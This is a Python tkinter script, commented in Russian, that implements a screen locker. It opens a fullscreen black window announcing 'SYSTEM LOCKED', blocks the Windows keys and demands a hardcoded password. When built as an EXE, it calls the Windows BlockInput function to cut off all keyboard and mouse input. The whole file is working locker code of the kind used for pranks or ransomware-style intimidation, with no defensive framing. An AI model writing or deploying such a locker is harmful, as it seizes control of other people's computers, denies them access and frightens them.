import tkinter as tk
from tkinter import messagebox
import sys

def disable_system_keys(event):
    if event.keysym in ("Super_L", "Super_R"):
        return "break"

def check_password(event=None):
    if entry.get() == "666":
        root.destroy()
    else:
        messagebox.showerror("Ошибка", "Неверный пароль!")
        entry.delete(0, tk.END)
        entry.focus()

# Проверка, что это не EXE-файл (для тестирования)
if getattr(sys, 'frozen', False):
    import ctypes
    ctypes.windll.user32.BlockInput(True)  # Блокировка ввода (только в EXE)

root = tk.Tk()
root.title("")
root.attributes("-fullscreen", True)
root.configure(bg="black")

# Тексты
tk.Label(root, text="ВНИМАНИЕ! СИСТЕМА ЗАБЛОКИРОВАНА", 
        font=("Arial", 24), fg="red", bg="black").pack(pady=40)
tk.Label(root, text="Введите пароль для разблокировки:", 
        font=("Arial", 16), fg="white", bg="black").pack()

# Поле ввода
entry = tk.Entry(root, font=("Arial", 20), show="*", 
                bg="black", fg="white", insertbackground="white",
                width=20, bd=0, highlightthickness=1, 
                highlightcolor="red", highlightbackground="red")
entry.pack(pady=20)
entry.focus()

# Кнопка
tk.Button(root, text="Разблокировать", font=("Arial", 16),
         bg="white", fg="black", activebackground="#e0e0e0",
         command=check_password).pack(pady=10)

# Бинды
root.bind("<KeyPress>", disable_system_keys)
entry.bind("<Return>", check_password)

root.mainloop()